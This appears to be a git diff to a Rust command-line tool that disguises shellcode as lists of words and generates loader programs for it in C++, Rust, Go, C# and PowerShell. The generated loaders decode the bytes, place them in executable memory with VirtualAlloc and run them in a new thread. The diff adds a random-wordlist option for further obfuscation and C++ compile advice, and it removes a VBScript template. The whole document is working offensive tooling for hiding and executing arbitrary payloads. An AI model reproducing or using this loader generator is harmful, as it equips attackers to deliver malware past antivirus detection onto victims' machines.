@@ -3,6 +3,7 @@ use std::fs;
 use std::collections::HashSet;
 use std::io::{BufRead, BufReader};
 use rand::seq::SliceRandom;
+use rand::Rng;
 use clap::{Arg, Command};
 
 #[derive(Debug)]
@@ -10,7 +11,8 @@ struct Args {
     input_file: PathBuf,
     output_file: PathBuf,
     template_name: String,
-    wordlist_path: Option<PathBuf>
+    wordlist_path: Option<PathBuf>,
+    random: bool,
 }
 
 fn parse_args() -> Args {
@@ -51,16 +53,28 @@ fn parse_args() -> Args {
                 .num_args(1)
                 .required(false)
         )
+        .arg(
+            Arg::new("random")
+                .short('r')
+                .help("Use a randomly generated wordlist")
+                .required(false)
+                .num_args(0)
+        )
         .get_matches();
-
     Args {
         input_file: PathBuf::from(matches.get_one::<String>("input").unwrap()),
         output_file: PathBuf::from(matches.get_one::<String>("output").unwrap()),
         template_name: matches.get_one::<String>("template").unwrap().to_string(),
-        wordlist_path: matches.get_one::<String>("wordlist").map(PathBuf::from)
+        wordlist_path: matches.get_one::<String>("wordlist").map(PathBuf::from),
+        random: matches.contains_id("random")
     }
+}
 
-    
+fn generate_random_word(length: usize) -> String {
+    let mut rng = rand::thread_rng();
+    (0..length)
+        .map(|_| rng.gen_range(b'a'..=b'z') as char) // Generate random ASCII letters
+        .collect()
 }
 
 fn get_words(dir_path: &Path) -> std::io::Result<Vec<String>> {
@@ -145,23 +159,118 @@ fn verify_encoding(original: &[u8], encoded: &[String], word_list: &[String]) {
     }
 }
 
-fn generate_output(encoded: &[String], word_list: &[String], template: &str) -> String {
-    let encoded_str = encoded.iter()
-        .map(|s| format!("\"{}\"", s))
-        .collect::<Vec<_>>()
-        .join(", ");
+fn chunk_shellcode(payload: &[String], cap: usize) -> Vec<String> {
+    let chunk_size = 25; // Smaller chunks to avoid compiler issues
+    let mut chunks = Vec::new();
+    let mut current_chunk = Vec::with_capacity(chunk_size);
+    let mut current_line = String::with_capacity(chunk_size * 20); // Rough estimate for string size
     
+    for item in payload.iter() {
+        // Add item to current chunk
+        current_chunk.push(format!("\"{}\"", item));
+        
+        // If chunk is full, join it and add to chunks vector
+        if current_chunk.len() >= chunk_size {
+            current_line = current_chunk.join(", ");
+            chunks.push(current_line);
+            current_chunk.clear();
+        }
+    }
+    
+    // Handle any remaining items
+    if !current_chunk.is_empty() {
+        current_line = current_chunk.join(", ");
+        chunks.push(current_line);
+    }
+    
+    chunks
+}
+
+fn generate_output(encoded: &[String], word_list: &[String], template: &str) -> String {
+    let (chunked, encoded_str) = if template == "cpp" {
+        let chunked = chunk_shellcode(&encoded, 25); // Adjust chunk size as needed
+        let encoded_chunks: Vec<String> = chunked
+            .iter()
+            .enumerate()
+            .map(|(i, chunk)| format!("std::vector<std::string> encodedWordsPart{} = {{{}}};", i, chunk.as_str()))
+            .collect();
+        let encoded_merge_code = (0..chunked.len())
+            .map(|i| format!("encodedWords.insert(encodedWords.end(), encodedWordsPart{}.begin(), encodedWordsPart{}.end());", i, i))
+            .collect::<Vec<_>>()
+            .join("\n    ");
+        (encoded_chunks, encoded_merge_code)
+    } else {
+        // Non-C++ logic stays the same
+        (Vec::new(), encoded.iter()
+            .map(|s| format!("\"{}\"", s))
+            .collect::<Vec<_>>()
+            .join(", "))
+    };
+
     let wordlist_str = word_list.iter()
         .map(|s| format!("\"{}\"", s))
         .collect::<Vec<_>>()
         .join(", ");
 
     match template {
-        "cpp" => format!(
-            "#include <vector>\n#include <string>\n#include <windows.h>\n#include <stdio.h>\n\ntypedef unsigned char BYTE;\n\nstd::vector<std::string> encodedWords = {{{}}};\n\nstd::vector<std::string> wordList = {{{}}};\n\nstd::vector<BYTE> Decode(const std::vector<std::string>& encoded) {{\n    std::vector<BYTE> shellcode;\n    printf(\"[+] Decoding %zu bytes\\n\", encoded.size());\n    \n    for(const auto& word : encoded) {{\n        for(size_t i = 0; i < wordList.size(); i++) {{\n            if(wordList[i] == word) {{\n                shellcode.push_back((BYTE)i);\n                if(shellcode.size() <= 5) {{\n                    printf(\"[+] Decoded byte %zu: 0x%02x\\n\", shellcode.size()-1, (BYTE)i);\n                }}\n                break;\n            }}\n        }}\n    }}\n    return shellcode;\n}}\n\nint main() {{\n    printf(\"[+] Starting decoder\\n\");\n    auto shellcode = Decode(encodedWords);\n    \n    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    printf(\"[+] Allocated memory at %p\\n\", exec);\n    \n    RtlMoveMemory(exec, shellcode.data(), shellcode.size());\n    printf(\"[+] Copied shellcode\\n\");\n    \n    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);\n    printf(\"[+] Created thread\\n\");\n    \n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}}", 
-            encoded_str, 
-            wordlist_str
-        ),
+        // this was so hard to figure out for compilation....
+        "cpp" => format!(r#"
+#include <vector>
+#include <string>
+#include <windows.h>
+#include <stdio.h>
+
+typedef unsigned char BYTE;
+
+// Encoded words split into smaller chunks
+{chunked}
+
+std::vector<std::string> encodedWords;
+std::vector<std::string> wordList = {{{wordlist_str}}};
+
+std::vector<BYTE> Decode(const std::vector<std::string>& encoded) {{
+    std::vector<BYTE> shellcode;
+    printf("[+] Decoding %zu bytes\n", encoded.size());
+
+    for (const auto& word : encoded) {{
+        for (size_t i = 0; i < wordList.size(); i++) {{
+            if (wordList[i] == word) {{
+                shellcode.push_back((BYTE)i);
+                if (shellcode.size() <= 5) {{
+                    printf("[+] Decoded byte %zu: 0x%02x\n", shellcode.size() - 1, (BYTE)i);
+                }}
+                break;
+            }}
+        }}
+    }}
+    return shellcode;
+}}
+
+int main() {{
+    printf("[+] Starting decoder\n");
+
+    // Merge chunks
+    {encoded_str}
+
+    auto shellcode = Decode(encodedWords);
+
+    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    printf("[+] Allocated memory at %p\n", exec);
+
+    RtlMoveMemory(exec, shellcode.data(), shellcode.size());
+    printf("[+] Copied shellcode\n");
+
+    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+    printf("[+] Created thread\n");
+
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}}
+"#,
+        chunked = chunked.join("\n"),
+        encoded_str = encoded_str,
+        wordlist_str = wordlist_str
+    ),
         
         "rust" => format!(
     r#"
@@ -234,7 +343,13 @@ fn main() {{
 }}"#,
     encoded_str, 
     wordlist_str
-        ),    
+        ),
+
+        "go" => format!(
+            "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nvar (\n\tkernel32      = syscall.NewLazyDLL(\"kernel32.dll\")\n\tvirtualAlloc  = kernel32.NewProc(\"VirtualAlloc\")\n\tcreateThread  = kernel32.NewProc(\"CreateThread\")\n\twaitForObject = kernel32.NewProc(\"WaitForSingleObject\")\n)\n\nfunc Decode(encodedWords []string, wordList []string) []byte {{\n\tshellcode := make([]byte, 0)\n\tfmt.Println(\"[+] Decoding shellcode...\")\n\n\tfor _, word := range encodedWords {{\n\t\tfor i, w := range wordList {{\n\t\t\tif w == word {{\n\t\t\t\tshellcode = append(shellcode, byte(i))\n\t\t\t\tbreak\n\t\t\t}}\n\t\t}}\n\t}}\n\n\treturn shellcode\n}}\n\nfunc main() {{\n\tencodedWords := []string{{{}}};\n\twordList := []string{{{}}};\n\n\tshellcode := Decode(encodedWords, wordList)\n\tfmt.Printf(\"[+] Decoded %d bytes\\n\", len(shellcode))\n\n\taddr, _, err := virtualAlloc.Call(\n\t\t0,\n\t\tuintptr(len(shellcode)),\n\t\t0x1000|0x2000,\n\t\t0x40,\n\t)\n\tif addr == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Memory allocated\")\n\n\t// Copy shellcode to allocated memory\n\tfor i := 0; i < len(shellcode); i++ {{\n\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]\n\t}}\n\tfmt.Println(\"[+] Shellcode copied\")\n\n\thandle, _, err := createThread.Call(\n\t\t0,\n\t\t0,\n\t\taddr,\n\t\tuintptr(0),\n\t\t0,\n\t\t0,\n\t)\n\tif handle == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Thread created\")\n\n\twaitForObject.Call(handle, 0xFFFFFFFF)\n}}",
+            encoded_str,
+            wordlist_str
+        ),
 
         "csharp" => format!(
             "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\n\nclass Program {{\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint size);\n\n    const uint MEM_COMMIT = 0x1000;\n    const uint MEM_RESERVE = 0x2000;\n    const uint PAGE_EXECUTE_READWRITE = 0x40;\n\n    static byte[] Decode(string[] encodedWords, string[] wordList) {{\n        var shellcode = new List<byte>();\n        Console.WriteLine(\"[+] Decoding shellcode...\");\n\n        foreach (var word in encodedWords) {{\n            var index = Array.IndexOf(wordList, word);\n            if (index != -1) {{\n                shellcode.Add((byte)index);\n            }}\n        }}\n\n        return shellcode.ToArray();\n    }}\n\n    static void Main() {{\n        string[] encodedWords = new string[] {{ {} }};\n        string[] wordList = new string[] {{ {} }};\n\n        byte[] shellcode = Decode(encodedWords, wordList);\n        Console.WriteLine($\"[+] Decoded {{shellcode.Length}} bytes\");\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        Console.WriteLine(\"[+] Memory allocated\");\n\n        RtlMoveMemory(addr, shellcode, (uint)shellcode.Length);\n        Console.WriteLine(\"[+] Shellcode copied\");\n\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        Console.WriteLine(\"[+] Thread created\");\n\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }}\n}}",
@@ -242,19 +357,6 @@ fn main() {{
             wordlist_str
         ),
     
-        // This may be complete garbage nonsense. If it doesnt work, let me know and I'll fix it. Or at least try to. I at least wanted to try to make it work.
-        "wsh" => format!(
-            "Option Explicit\n\nFunction Base64ToStream(b)\n  Dim enc, length, ba, transform, ms\n  Set enc = CreateObject(\"System.Text.ASCIIEncoding\")\n  length = enc.GetByteCount_2(b)\n  Set transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\")\n  ba = transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length)\n  Set ms = CreateObject(\"System.IO.MemoryStream\")\n  ms.Write ba, 0, UBound(ba) + 1\n  ms.Position = 0\n  Set Base64ToStream = ms\nEnd Function\n\nFunction Decode(encodedWords, wordList)\n    Dim shellcode()\n    ReDim shellcode(UBound(encodedWords))\n    \n    WScript.Echo \"[+] Decoding shellcode...\"\n    \n    Dim i, word, j, found\n    For i = 0 To UBound(encodedWords)\n        word = encodedWords(i)\n        found = False\n        \n        For j = 0 To UBound(wordList)\n            If wordList(j) = word Then\n                shellcode(i) = j\n                found = True\n                Exit For\n            End If\n        Next\n        \n        If Not found Then\n            WScript.Echo \"[-] Word not found: \" & word\n            WScript.Quit\n        End If\n    Next\n    \n    Decode = shellcode\nEnd Function\n\nDim encodedWords: encodedWords = Array({})\nDim wordList: wordList = Array({})\n\nDim shellcode: shellcode = Decode(encodedWords, wordList)\nWScript.Echo \"[+] Decoded \" & UBound(shellcode) + 1 & \" bytes\"\n\nDim objShell: Set objShell = CreateObject(\"WScript.Shell\")\nDim exec: exec = objShell.ExpandEnvironmentStrings(\"%COMSPEC%\")\nobjShell.Run exec",
-            encoded_str,
-            wordlist_str
-        ),
-    
-        "go" => format!(
-            "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nvar (\n\tkernel32      = syscall.NewLazyDLL(\"kernel32.dll\")\n\tvirtualAlloc  = kernel32.NewProc(\"VirtualAlloc\")\n\tcreateThread  = kernel32.NewProc(\"CreateThread\")\n\twaitForObject = kernel32.NewProc(\"WaitForSingleObject\")\n)\n\nfunc Decode(encodedWords []string, wordList []string) []byte {{\n\tshellcode := make([]byte, 0)\n\tfmt.Println(\"[+] Decoding shellcode...\")\n\n\tfor _, word := range encodedWords {{\n\t\tfor i, w := range wordList {{\n\t\t\tif w == word {{\n\t\t\t\tshellcode = append(shellcode, byte(i))\n\t\t\t\tbreak\n\t\t\t}}\n\t\t}}\n\t}}\n\n\treturn shellcode\n}}\n\nfunc main() {{\n\tencodedWords := []string{{{}}};\n\twordList := []string{{{}}};\n\n\tshellcode := Decode(encodedWords, wordList)\n\tfmt.Printf(\"[+] Decoded %d bytes\\n\", len(shellcode))\n\n\taddr, _, err := virtualAlloc.Call(\n\t\t0,\n\t\tuintptr(len(shellcode)),\n\t\t0x1000|0x2000,\n\t\t0x40,\n\t)\n\tif addr == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Memory allocated\")\n\n\t// Copy shellcode to allocated memory\n\tfor i := 0; i < len(shellcode); i++ {{\n\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]\n\t}}\n\tfmt.Println(\"[+] Shellcode copied\")\n\n\thandle, _, err := createThread.Call(\n\t\t0,\n\t\t0,\n\t\taddr,\n\t\tuintptr(0),\n\t\t0,\n\t\t0,\n\t)\n\tif handle == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Thread created\")\n\n\twaitForObject.Call(handle, 0xFFFFFFFF)\n}}",
-            encoded_str,
-            wordlist_str
-        ),
-
         "powershell" => format!(
             r#"
             $VrtAlloc = @"
@@ -315,7 +417,6 @@ fn main() {{
             wordlist_str
         ),
 
-        // Alternative PowerShell implementation using pure PowerShell (no C# inline compilation)
         "powershell_alt" => format!(
             r#"
 $EncodedWords = @({})
@@ -343,7 +444,7 @@ function Invoke-Shellcode {{
     Write-Host "[+] Decoded $($Shellcode.Length) bytes"
 
     # Define required functions
-    $Kernel32 = @{{
+    $Kernel32 = {{
         VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
             (Get-ProcAddress kernel32.dll VirtualAlloc),
             (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
@@ -440,8 +541,9 @@ try {{
         ),
         _ => panic!("Unsupported template")
     }
-
 }
+
+
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     if std::env::args().len() == 1 {
@@ -460,15 +562,16 @@ Options:
     }
 
     let args = parse_args();
-    
-    // If you're reading this, and can think of a better way to do this, let me know.
-    if args.template_name != "cpp" && args.template_name != "rust" && args.template_name != "csharp" && args.template_name != "go" && args.template_name != "wsh" && args.template_name != "powershell" && args.template_name != "powershell_alt" {
-        return Err("Unsupported template".into());
+    if args.random && args.wordlist_path.is_some() {
+        return Err("Cannot use both --random and --wordlist".into());
     }
 
-    println!("Generating wordlist...");
-    
-    let wordlist = if let Some(wordlist_path) = &args.wordlist_path {
+    let random_flag = args.random;
+
+    let wordlist = if random_flag {
+        println!("Using randomly generated wordlist");
+        (0..256).map(|_| generate_random_word(4)).collect()
+    } else if let Some(wordlist_path) = &args.wordlist_path {
         println!("Using custom wordlist directory: {:?}", wordlist_path);
         get_words_from_file(wordlist_path)?
     } else if cfg!(target_os = "linux") {
@@ -503,6 +606,12 @@ Options:
         println!("\n{}", "*".repeat(80));
         println!("I did not test the generated code for VBS. It may not work.");
         println!("{}\n", "*".repeat(80));
+    }
+
+    if args.template_name == "cpp"{
+        println!("Compilie using the following command:\n");
+        println!("cl .\\output.cpp /EHsc /Od /bigobj\n");
+        println!("If you don't, it may fail.")
     }
 
     println!("Done!");
